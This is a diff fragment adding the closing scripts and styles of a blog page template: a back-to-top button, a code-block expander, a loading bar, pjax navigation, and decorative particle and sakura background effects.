+        btn.id = "backTopBtn";
+        btn.onclick = backToTop
+        rightSideBar.appendChild(btn)
+        window.addEventListener('scroll', function() {
+            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
+                btn.style.display = "block";
+            } else {
+                btn.style.display = "none";
+            }
+        });
+    }
+
+    function backToTop(){
+        window.scrollTo({ top: 0, behavior: "smooth" })
+    }
+
+    initScrollTop();
+</script>
+
+
+<style>
+    .highlight {
+        max-height: 400px;
+        overflow: hidden;
+    }
+
+    .code-show {
+        max-height: none !important;
+    }
+
+    .code-more-box {
+        width: 100%;
+        padding-top: 78px;
+        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
+        position: absolute;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        z-index: 1;
+    }
+
+    .code-more-btn {
+        display: block;
+        margin: auto;
+        width: 44px;
+        height: 22px;
+        background: #f0f0f5;
+        border-top-left-radius: 8px;
+        border-top-right-radius: 8px;
+        padding-top: 6px;
+        cursor: pointer;
+    }
+
+    .code-more-img {
+        cursor: pointer !important;
+        display: block;
+        margin: auto;
+        width: 22px;
+        height: 16px;
+    }
+</style>
+
+<script>
+  function initCodeMoreBox() {
+    let codeBlocks = document.querySelectorAll(".highlight");
+    if (!codeBlocks) {
+      return;
+    }
+    codeBlocks.forEach(codeBlock => {
+      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
+        return;
+      }
+      let codeMoreBox = document.createElement('div');
+      codeMoreBox.classList.add('code-more-box');
+      let codeMoreBtn = document.createElement('span');
+      codeMoreBtn.classList.add('code-more-btn');
+      codeMoreBtn.addEventListener('click', () => {
+        codeBlock.classList.add('code-show');
+        codeMoreBox.style.display = 'none';
+        window.dispatchEvent(new Event('resize'))
+      })
+      let img = document.createElement('img');
+      img.classList.add('code-more-img');
+      img.src = "https:\/\/expl0rer.top\/icons\/codeMore.png"
+      codeMoreBtn.appendChild(img);
+      codeMoreBox.appendChild(codeMoreBtn);
+      codeBlock.appendChild(codeMoreBox)
+    })
+  }
+  
+  initCodeMoreBox();
+</script>
+
+
+
+
+
+
+<script>
+    function showHideView() {
+        let viewCounts = document.querySelectorAll("#viewCount");
+        if (viewCounts) {
+            let article =  document.querySelector(".article-page");
+            if (!article) {
+                viewCounts.forEach(ele => {
+                    ele.style.display = 'none';
+                });
+            }
+        }
+    }
+    
+    showHideView();
+</script>
+
+<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
+<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
+<script>
+    NProgress.start();
+    document.addEventListener("readystatechange", () => {
+        if (document.readyState === "interactive") NProgress.inc(0.8);
+        if (document.readyState === "complete") NProgress.done();
+    });
+</script>
+
+
+<script>
+    var pjax = new pjax({
+        selectors: [
+            ".main-container"
+        ]
+    })
+
+</script>
+
+<script>
+    pjax._handleResponse = pjax.handleResponse;
+    pjax.handleResponse = function(responseText, request, href, options) {
+        if (request.responseText.match("<html")) {
+            if (responseText) {
+                let newDom = new DOMParser().parseFromString(responseText, 'text/html');
+                let bodyClass = newDom.body.className;
+                document.body.setAttribute("class", bodyClass)
+            }
+            pjax._handleResponse(responseText, request, href, options);
+        } else {
+        }
+    }
+</script>
+
+
+
+<script>
+    document.addEventListener('pjax:complete', () => {
+        if (window.Stack && typeof window.Stack.init === 'function') {
+            window.Stack.init();
+        }
+    })
+</script>
+
+<div id="particles-js"></div>
+
+<script src="https://expl0rer.top/background/particles.min.js"></script>
+<script>
+  particlesJS.load('particles-js', "https:\/\/expl0rer.top\/background\/particlesjs-config.json", function() {
+    console.log('particles.js loaded - callback');
+  });
+</script>
+
+<style>
+  #particles-js {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    z-index: -1;
+  }
+</style>
+
+
+<script src="https://expl0rer.top/background/sakura.js"></script>
+
+    </body>
+</html>
